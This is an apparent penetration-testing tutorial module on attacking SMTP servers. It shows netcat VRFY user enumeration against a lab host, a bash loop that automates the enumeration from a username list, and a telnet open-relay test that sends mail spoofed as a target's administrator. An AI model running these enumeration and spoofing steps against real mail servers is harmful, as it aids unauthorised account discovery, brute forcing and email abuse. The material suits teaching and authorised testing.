# SMTP Mail User Enumeration
In this module we will learn how to attempt to enumerate users from a target system that is running Dovecot or Exim, or some other form of mail server.
## User List
When using **any** type of brute force attack, it is VERY important to enumerate as much as possible to build the best word list, in our case is a user list. In most cases, at least, add the enumerated hostname as a user. Look for weblogs and anything else that may contain reused UIDs, email addresses, or more.
### Using Netcat
To use Netcat to connect to a mail server simply do:

`root@kali:~# nc (TARGET IP ADDRESS) 25`

Next, we can use some helpful commands that could tell us more about the system. In this case, we wuse `VRFY`

```
wnl8:/pwnt/smtp# nc 192.168.161.129 25
220 vulnix ESMTP Postfix (Ubuntu)
VRFY vulnix
252 2.0.0 vulnix
VRFY root
252 2.0.0 root
VRFY dovecot
252 2.0.0 dovecot
VRFY nonexistentuser
550 5.1.1 <nonexistentuser>: Recipient address rejected: User unknown in local recipient table
^C
wnl8:/pwnt/smtp#
```

As you can see, when a valid user is identified by the mail server via the `VRFY` command, it returned `252 2.0.0 (USERNAME)` and when an invalid user was tested via `VRFY` the service returned `550 5.1.1 (USERNAME)`

### SMTP User Enumeration Automation
We can easily script this process by echoing the VRFY command directly into a netcat connection command for each name in a word list against the target server as so,
```
#!/bin/bash
while read user;
 do
  echo VRFY $user | nc -nv -w (TARGET IP ADDRESS) (TARGET SMTP PORT) 2>/dev/null | egrep "^252"
 done
< /path/to/usernames.txt
```
## SMTP EMAIL RELAY TEST
If you can connetc to the email server via telnet, you can test to see if we can send email via the server. Usually nmap will let us know whether or not the email server is a "relay" server with a message like,
```
25/tcp open  smtp    syn-ack ttl 55
| smtp-open-relay: Server is an open relay (13/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
```
I could not get the NSE script to work for this (almost ever) so I found that we can test the service manually like so,
```
root@demon-2.4.4:~/# telnet (TARGET IP ADDRESS) 25
Trying (TARGET IP ADDRESS)...
Connected to (TARGET IP ADDRESS).
Escape character is '^]'.
220 *********************************************************************************
EHLO (TARGET DOMAIN).com
250-(TARGET SUBDOMAIN).(TARGET DOMAIN).com Hello (TARGET DOMAIN).com [(YOUR IP ADDRESS)], pleased to meet you
250-STARTTLS
250-PIPELINING
250-8BITMIME
250 XXXA
MAIL FROM:<administrator@(TARGET DOMAIN).com>
250 Sender <administrator@(TARGET DOMAIN).com> OK
RCPT TO:<(YOUR EMAIL ADDRESS)@gmail.com> NOTIFY=success,failure
250 Recipient <(YOUR EMAIL ADDRESS)@gmail.com> OK
DATA    
354 Start mail input; end with <CRLF>.<CRLF>
Subject:This is a test

This is a test email.
.
250 Ok: queued as mailFwDDga
QUIT
221 emailarchiver.(TARGET DOMAIN).com Goodbye (TARGET DOMAIN).com, closing connection
Connection closed by foreign host.
```
